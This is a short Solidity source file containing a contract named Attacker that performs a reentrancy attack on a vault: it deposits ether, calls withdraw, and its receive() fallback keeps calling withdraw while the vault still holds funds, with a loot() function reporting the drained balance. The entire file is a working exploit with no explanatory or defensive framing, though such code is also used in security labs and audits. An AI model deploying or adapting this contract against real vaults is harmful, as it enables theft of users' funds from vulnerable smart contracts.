// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVault public vault;
    uint256 public stake;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function attack() external payable {
        stake = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= stake) {
            vault.withdraw();
        }
    }

    function loot() external view returns (uint256) {
        return address(this).balance;
    }
}
